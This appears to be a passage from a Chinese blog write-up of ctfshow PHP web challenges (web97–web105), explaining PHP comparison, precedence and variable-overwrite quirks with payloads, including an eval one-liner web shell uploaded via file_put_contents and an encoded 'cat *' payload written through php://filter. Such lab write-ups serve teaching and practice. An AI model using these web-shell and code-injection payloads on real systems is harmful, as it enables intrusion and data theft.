class="line">%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab</span><br><span class="line"></span><br><span class="line">%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</span><br></pre></td></tr></table></figure>
<p>构造成payload即可拿到flag</p>
</li>
</ul>
<p><strong>题外话</strong></p>
<ul>
<li>如果是MD5弱比较，使用强制类型转换后不再接收数组：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">md5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。</span><br><span class="line">payload: a=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure></li>
<li>md5强碰撞<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">这时候需要找到两个真正的md5值相同数据</span><br><span class="line"></span><br><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>考点是PHP的三元运算符和传址(引用) 传址(引用)有点像c语言里面的地址<br>第2行代码的意思是：只要有输入的get参数就将get方法改变为post方法(修改了get方法的地址)<br>第3,4行代码用处不大，因为我们不传入flag参数<br>第5行代码的意思是POST型提交一个HTTP_FLAG&#x3D;flag,由于get不会验证，所以随便填个1&#x3D;1就好。</p>
</li>
<li><p>构造payload<br>抓包，将头部的GET改为POST，并且添加Content-Type<br>GET型 <code>1=1</code><br>POST型 <code>HTTP_FLAG=flag</code><br>拿到flag</p>
</li>
</ol>
<h1 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>array_push()函数<br>将一个或多个单元压入数组的末尾（入栈）<br><code>array_push(array &amp;$array, mixed $value1, mixed $... = ?): int</code><br>array_push() 将 array 当成一个栈，并将传入的变量压入 array 的末尾。array 的长度将根据入栈变量的数目增加。</p>
</li>
<li><p>in_array()函数<br>检查数组中是否存在某个值<br><code>in_array(mixed $needle, array $haystack, bool $strict = false): bool</code><br>如果没有设置 strict 则使用宽松的比较。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">needle</span><br><span class="line">待搜索的值。</span><br><span class="line">注意:</span><br><span class="line">如果 needle 是字符串，则比较是区分大小写的。</span><br><span class="line">haystack</span><br><span class="line">待搜索的数组。</span><br><span class="line">strict</span><br><span class="line">如果第三个参数 strict 的值为 true 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同。</span><br><span class="line">注意:</span><br><span class="line">在 PHP 8.0.0 之前，string needle 在非严格模式下将会匹配数组中的值 0，反之亦然。这可能会导致不希望的结果。其它类型也存在类似的边缘情况。如果不是绝对确定有关值的类型，请始终使用 strict flag 以避免意外行为。</span><br></pre></td></tr></table></figure>
</li>
<li><p>file_put_contents()函数<br>将数据写入文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_put_contents(</span><br><span class="line">    string $filename,</span><br><span class="line">    mixed $data,</span><br><span class="line">    int $flags = 0,</span><br><span class="line">    ?resource $context = null</span><br><span class="line">): int|false</span><br></pre></td></tr></table></figure>
<p>如果 filename 不存在，将会创建文件。反之，存在的文件将会重写，除非设置 FILE_APPEND flag。</p>
</li>
</ul>
<p>通过该源码可知，将随机数放入数组$allow里。<br>get型传参的值与数组$allow作比较，如果在里面，就通过post传参变量content写入文件名变量n内。<br>即创造一个文件，文件名为变量n的值，文件内容为变量content的值。</p>
<ol start="2">
<li>构造payload<br>由于in_array数组有缺陷，会把1.php解析为1，由此我们可构造出一个php文件，通过post传参传入一句话木马：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: ?n=1.php    POST: content:&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
因为是随机数，所以1不一定每次都在数组中，如果失败多试几次便可。<br>然后我们再访问： <code>url/1.php</code><br>成功后打开蚁剑，连接这个url，密码为1。<br>之后找到flag36d.php文件，拿到flag。</li>
</ol>
<h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>is_numeric()函数<br>检测变量是否为数字或数字字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">is_numeric(mixed $value): bool</span><br><span class="line">如果 value 是数字或数字字符串， 返回 true，否则返回 false。</span><br></pre></td></tr></table></figure>
</li>
<li><p>eval()函数<br>把字符串作为PHP代码执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(string $code): mixed</span><br><span class="line">返回值</span><br><span class="line">eval() 返回 null，除非在执行的代码中 return 了一个值，函数返回传递给 return 的值。 PHP 7 开始，执行的代码里如果有一个 parse error，eval() 会抛出 ParseError 异常。在 PHP 7 之前， 如果在执行的代码中有 parse error，eval() 返回 false，之后的代码将正常执行。无法使用 set_error_handler() 捕获 eval() 中的解析错误。</span><br></pre></td></tr></table></figure></li>
</ul>
<p>通过该源码可知，我们需要通过GET方式传入3个参数，并且将判断三个参数是否为数字或数字字符串。<br>检测v2和v3是否具有那些过滤的值，然后用eval函数输出为代码。</p>
<ol start="2">
<li>构造payload<br>这里的考点是运算符的优先级，由于在v0这一行代码的比较中，等于（&#x3D;）符号的优先级高于and符号，因此代码会执行为判断v1是否为数字，返回的布尔值传到v0，而v2，v3的判断并没有传入。因此我们可以输入任意v2，v3的字符。<br>由于eval将括号内的字符执行为代码，我们可以用var_dump函数打印出flag，于是构造payload如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</span><br></pre></td></tr></table></figure>
最终拿到flag</li>
</ol>
<h1 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>相比于上一关，本关的黑名单更多，用一般的函数无法拿到flag，于是我们需要想办法使用其它方法。</p>
</li>
<li><p>构造语句<br>可以使用ReflectionClass类来显示出flag，ReflectionClass 类报告了一个类的有关信息。<br><a href="https://www.php.net/manual/zh/class.reflectionclass.php">ReflectionClass 类 </a><br>构造示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>
<p>由于hint说flag最后少了一位，因此需要最后爆破16次。<br>拿到flag</p>
</li>
</ol>
<h1 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>substr()函数<br>返回字符串的子串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(string $string, int $offset, ?int $length = null): string</span><br><span class="line">string</span><br><span class="line">输入字符串。</span><br><span class="line">offset</span><br><span class="line">如果 offset 是非负数，返回的字符串将从 string 的 offset 位置开始，从 0 开始计算。</span><br><span class="line">例如，在字符串 “abcdef” 中，在位置 0 的字符是 “a”，位置 2 的字符串是 “c” 等等。</span><br><span class="line">如果 offset 是负数，返回的字符串将从 string 结尾处向前数第 offset 个字符开始。</span><br><span class="line">如果 string 的长度小于 offset，将返回空字符串。</span><br><span class="line">length</span><br><span class="line">如果提供了正数的 length，返回的字符串将从 offset 处开始最多包括 length 个字符（取决于 string 的长度）。</span><br><span class="line">如果提供了负数的 length，那么 string 末尾处的 length 个字符将会被省略（若 offset 是负数则从字符串尾部算起）。</span><br><span class="line">如果 offset 不在这段文本中，那么将返回空字符串。</span><br><span class="line">如果提供了值为 0 的 length，那么将返回一个空字符串。</span><br><span class="line">如果忽略 length 或为 null，返回的子字符串将从 offset 位置开始直到字符串结尾。</span><br></pre></td></tr></table></figure>
</li>
<li><p>call_user_func()函数<br>把第一个参数作为回调函数调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func(callable $callback, mixed ...$args): mixed</span><br><span class="line">callback</span><br><span class="line">将被调用的回调函数</span><br><span class="line">args</span><br><span class="line">0个或以上的参数，被传入回调函数。</span><br></pre></td></tr></table></figure>
</li>
<li><p>hex2bin()函数<br>转换十六进制字符串为ASCII字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex2bin(string $string): string|false</span><br><span class="line">string</span><br><span class="line">十六进制表示的数据</span><br><span class="line">返回值</span><br><span class="line">返回给定数据的ASCII字符串表示 或者在失败时返回 false。</span><br></pre></td></tr></table></figure></li>
</ul>
<p>根据源码可知，传入1个POST参数v1，2个GET参数v2,v3<br>根据v4的表达式，可知v2必须为数字或数字字符串（可以使用科学计数法）。v3不受限制。<br>从第3个数字开始截取v2一直到结尾，送给变量s。<br>调用call_user_func()函数，将v3作为函数名调用，传入s作为参数。得到的值赋给变量str。<br>最后v3作为文件名，变量str的值写入v3文件中。</p>
<ol start="2">
<li>构造payload<br>由于is_numeric()函数只允许使用数字和e（科学计数法），不能包含其它字符，所以需要构造仅含数字和e的参数。<br>由此我们可以想到把内容通过base64加密，之后转化为16进制字符串，找到符合条件的语句。<br>最终我们通过下面代码找到了：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;&lt;?=`cat *`;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);  <span class="comment">// $b=&quot;PD89YGNhdCAqYDs=&quot;,由于等号(=)只是作为填充位，不影响最终结果，因此可以删去 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;PD89YGNhdCAqYDs&quot;</span>);  <span class="comment">// $c=5044383959474e6864434171594473,符合条件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
由于是从v2的第3位开始截取，因此前两位需要填充任意数字，最终得到v2为：<br><code>005044383959474e6864434171594473</code><br>由于file_put_contents()函数允许使用伪协议，于是通过PHP伪协议写入文件，因此我们可以将v3构造为：<br><code>php://filter/write=convert.base64-decode/resource=a.php</code><br>v1为POST传参：<br><code>hex2bin</code></li>
</ol>
<p>构造完成后提交，访问a.php，查看源代码。<br>即可拿到flag</p>
<h1 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h1><p>和web102相同</p>
<h1 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h1><p>很简单，要两个SHA1值相同，但没有验证本身值是否不同，因此直接传入两个相同的值即可拿到flag。<br>但本意应该是考察SHA1加解密的缺陷：<br>sha1()函数无法处理数组类型，将报错并返回false<br>sha1()函数的弱相等<br>或者用科学计数法（0exxx）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v1=aaK1STfY    //0e76658526655756207688271159624026011393</span><br><span class="line">v2=aaO8zKZF    //0e89257456677279068558073954252716165668</span><br></pre></td></tr></table></figure>
<p>最简单的payload:<br>GET:v1&#x3D;1<br>POST:v2&#x3D;1<br>拿到flag</p>
<h1 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>error_reporting()函数<br>设置应该报告何种 PHP 错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(?int $error_level = null): int</span><br><span class="line">error_reporting() 函数能够在运行时设置 error_reporting 指令。</span><br><span class="line">PHP 有诸多错误级别，使用该函数可以设置在脚本运行时的级别。</span><br><span class="line">如果没有设置可选参数 error_level， error_reporting() 仅会返回当前的错误报告级别。</span><br><span class="line">// 关闭所有PHP错误报告</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">// Report simple running errors</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE);</span><br><span class="line"></span><br><span class="line">// 报告 E_NOTICE (报告未初始化的变量</span><br><span class="line">// 或者捕获变量名的错误拼写)</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);</span><br><span class="line"></span><br><span class="line">// 除了 E_NOTICE，报告其他所有错误</span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line">// 报告所有 PHP 错误</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line">// 报告所有 PHP 错误</span><br><span class="line">error_reporting(-1);</span><br><span class="line"></span><br><span class="line">// 和 error_reporting(E_ALL); 一样</span><br><span class="line">ini_set(&#x27;error_reporting&#x27;, E_ALL);</span><br></pre></td></tr></table></figure>
</li>
<li><p>foreach<br>foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foreach (iterable_expression as $value)</span><br><span class="line">    statement</span><br><span class="line">foreach (iterable_expression as $key =&gt; $value)</span><br><span class="line">    statement</span><br><span class="line">第一种格式遍历给定的 iterable_expression 迭代器。每次循环中，当前单元的值被赋给 $value。</span><br><span class="line">第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 $key。</span><br><span class="line">注意 foreach 不会修改类似 current() 和 key() 函数所使用的数组内部指针。</span><br><span class="line">还能够自定义遍历对象。</span><br><span class="line">可以很容易地通过在 $value 之前加上 &amp; 来修改数组的元素。此方法将以引用赋值而不是拷贝一个值。</span><br></pre></td></tr></table></figure>
</li>
<li><p>die()函数<br>等同于exit(), 输出一个消息并且退出当前脚本。</p>
</li>
<li><p>$$变量覆盖<br><a href="https://www.ineedyou.xyz/archives/87/">变量覆盖的知识</a></p>
</li>
</ul>
<p>从源码可以看出，我们GET不能传: <code>error=xx</code>  POST不能传: <code>xxx=flag</code><br>并且GET传参和POST传参均会进行变量覆盖。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br></pre></td></tr></table></figure>
<p>这条if语句若想要绕过要么已知flag的值，要么设置值为空。<br>看需求是否用到error考虑需不需要绕过。</p>
<ol start="2">
<li>构造payload<br>分析源码后，我们GET需要传入：<br><code>suces=flag</code><br>这样做的目的是为了将变量flag的值传入变量suces，并且变量flag的值被清空。<br>并且POST传入：<br><code>error=suces</code><br>这样一来， <code>$_POST[&#39;flag&#39;]==$flag</code> 便返回false，最终if语句将执行die函数。<br>而变量error的值为suces的值，即原来flag的值。那么将会输出flag。<br>这样就拿到flag了。</li>
</ol>
<p>或者POST也可以为：<br><code>flag=</code><br>这样一来， <code>$_POST[&#39;flag&#39;]==$flag</code> 便返回true，最终if语句不会执行die函数。<br>转而继续往下执行，最后输出变量suces的值，也即flag的值（因为已经变量覆盖了，$flag就是$suces）<br>最终拿到flag</p>
<h1 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h1><ol>
